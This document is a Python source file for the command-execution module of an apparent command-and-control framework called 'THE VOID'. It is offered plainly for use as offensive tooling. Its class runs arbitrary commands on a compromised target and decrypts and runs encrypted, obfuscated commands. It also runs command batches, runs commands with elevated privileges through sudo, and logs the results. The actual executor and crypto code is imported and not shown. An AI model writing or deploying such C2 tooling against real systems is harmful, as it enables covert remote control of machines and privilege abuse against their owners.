"""THE VOID — C2Commands: C2 command execution module.

The agent executes commands on the target through the C2 channel.
Commands are encrypted, obfuscated, and executed in a sandboxed environment.
"""

import json
import logging
import os
import time
from typing import Any, Dict, List, Optional

from core.executor import Executor, CommandResult
from core.crypto import Crypto

logger = logging.getLogger("void.c2.commands")


class C2Commands:
    """C2 command execution — runs commands on the target via C2 channel."""

    def __init__(self, executor: Optional[Executor] = None, crypto: Optional[Crypto] = None):
        self.executor = executor or Executor()
        self.crypto = crypto or Crypto()
        self.command_log: List[Dict[str, Any]] = []
        logger.info("C2Commands initialized")

    def execute(self, command: str, timeout: int = 30) -> Dict[str, Any]:
        """Execute a command on the target.

        Args:
            command: The command to execute
            timeout: Timeout in seconds

        Returns:
            Dict with command execution result
        """
        logger.info(f"Executing command: {command[:100]}")
        encrypted_cmd = self.crypto.encrypt(command)

        start_time = time.time()
        result = self.executor.run_command(command, timeout=timeout)
        elapsed = time.time() - start_time

        output = {
            "command": command[:500],
            "encrypted_cmd": encrypted_cmd[:200],
            "success": result.success,
            "stdout": result.stdout[:5000] if result.stdout else "",
            "stderr": result.stderr[:500] if result.stderr else "",
            "exit_code": result.exit_code,
            "elapsed": round(elapsed, 3),
            "timestamp": time.time(),
        }
        self.command_log.append(output)
        return output

    def execute_encoded(self, encoded_cmd: str, timeout: int = 30) -> Dict[str, Any]:
        """Execute an encoded (encrypted) command.

        Args:
            encoded_cmd: Encrypted command
            timeout: Timeout in seconds

        Returns:
            Dict with command execution result
        """
        logger.info(f"Executing encoded command: {encoded_cmd[:50]}")
        decrypted = self.crypto.decrypt(encoded_cmd)
        if decrypted is None:
            return {"error": "Failed to decrypt command", "success": False}
        return self.execute(decrypted, timeout)

    def batch_execute(self, commands: List[str], timeout: int = 30) -> List[Dict[str, Any]]:
        """Execute multiple commands sequentially.

        Args:
            commands: List of commands to execute
            timeout: Timeout per command

        Returns:
            List of command results
        """
        logger.info(f"Batch executing {len(commands)} commands")
        results = []
        for cmd in commands:
            result = self.execute(cmd, timeout)
            results.append(result)
        return results

    def execute_with_output(self, command: str, timeout: int = 30) -> str:
        """Execute a command and return the stdout.

        Args:
            command: The command to execute
            timeout: Timeout in seconds

        Returns:
            Command stdout
        """
        result = self.execute(command, timeout)
        return result.get("stdout", "")

    def execute_privileged(self, command: str, timeout: int = 30) -> Dict[str, Any]:
        """Execute a command with elevated privileges.

        Args:
            command: The command to execute
            timeout: Timeout in seconds

        Returns:
            Dict with command execution result
        """
        sudo_cmd = f"sudo {command}"
        return self.execute(sudo_cmd, timeout)

    def get_log(self) -> List[Dict[str, Any]]:
        """Get the command execution log."""
        return self.command_log

    def get_summary(self) -> Dict[str, Any]:
        """Get summary of command executions."""
        total = len(self.command_log)
        successful = sum(1 for cmd in self.command_log if cmd.get("success"))
        return {
            "total": total,
            "successful": successful,
            "failed": total - successful,
            "commands": self.command_log[-20:],  # Last 20 commands
        }
